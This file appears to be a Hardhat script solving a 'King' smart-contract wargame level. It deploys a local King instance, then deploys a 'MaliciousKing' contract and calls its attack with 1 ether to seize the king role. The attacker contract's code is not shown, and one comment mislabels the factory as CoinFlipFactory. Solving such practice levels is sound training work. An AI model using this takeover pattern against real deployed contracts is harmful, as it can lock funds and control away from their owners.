const { ethers } = require('hardhat');

async function main() {
    const [owner, player] = await ethers.getSigners();
    console.log("\n[0] original owner: ", owner.address);
    console.log("[0] player: ", player.address);

    // deploy factory
    console.log("\n[1] deploy CoinFlipFactory");
    const Factory = await ethers.getContractFactory("KingFactory");
    const factory = await Factory.connect(owner).deploy();
    await factory.deployed();
    console.log("---- KingFactory address: ", factory.address);

    // deploy new instance
    console.log("\n[2] create a King instance");
    const receipt = await factory.connect(player).createInstance(player.address, {
        value: ethers.utils.parseEther("0.001"),
    });
    const instance_address = (await receipt.wait()).events[0].args[0];
    const king = await ethers.getContractAt("King", instance_address, owner);

    console.log("\n[3] deploy MALICIOUS KING");
    const MalKing = await ethers.getContractFactory("MaliciousKing");
    const malKing = await MalKing.connect(player).deploy();
    await malKing.deployed();
    console.log("---- Malicious King address: ", malKing.address);

    console.log("\n[4] take over the King-Ship");

    console.log("king: ", await king._king());

    await malKing.attack(king.address, {
        value: ethers.utils.parseEther("1"),
    });

    console.log("king: ", await king._king());

    // check
    let res = await factory.validateInstance(king.address, player.address);
    res = (await res.wait()).events[0].args[0];

    if (res == true) {
        console.log("[+] Done!");
    } else {
        console.log("[+] Fail...");
    }
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});


